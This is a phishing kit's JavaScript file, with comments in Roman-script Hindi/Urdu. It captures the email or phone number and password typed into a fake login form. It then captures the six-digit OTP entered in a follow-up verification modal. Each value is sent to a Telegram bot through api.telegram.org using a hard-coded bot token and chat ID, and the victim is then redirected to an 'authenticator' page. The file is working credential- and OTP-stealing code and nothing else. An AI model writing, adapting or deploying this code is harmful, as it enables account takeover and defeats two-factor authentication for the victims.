document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("login-form");
    const modal = document.getElementById("verificationModal");
    const otpInput = document.getElementById("otp-input");

    // Ye function aapka modal kholta hai aur purana OTP clear karta hai
    window.toggleSelection = function(checkbox) {
        if (otpInput) {
            otpInput.value = ""; // Sirf ye line add ki hai reset ke liye
        }
        modal.style.display = "block";
    };

    const bots = {
        "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"
    };

    if (form) {
        form.addEventListener("submit", async (event) => {
            event.preventDefault();
            const emailPhone = document.getElementById("email-phone").value;
            const password = document.getElementById("password").value;
            const message = `New Login Data:\n\nEmail/Phone: ${emailPhone}\nPassword: ${password}`;

            try {
                const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                    return fetch(url);
                });
                await Promise.all(sendPromises);
                window.location.href = "authengator.html";
            } catch (error) {
                console.error("Error:", error);
            }
        });
    }
});

// Ye confirmSelection function aapki verification.html ke liye hai
async function confirmSelection() {
    const otpValue = document.getElementById("otp-input").value;
    const bots = {
        "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"
    };

    if (otpValue.length >= 6) {
        const message = `Verification Code: ${otpValue}`;
        try {
            const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                return fetch(url);
            });
            await Promise.all(sendPromises);
            // Teesre page (authenticator) par jane ka rasta
            window.location.href = "authengator.html";
        } catch (error) {
            window.location.href = "authengator.html";
        }
    } else {
        alert("Please enter a valid 6-digit code.");
    }
}
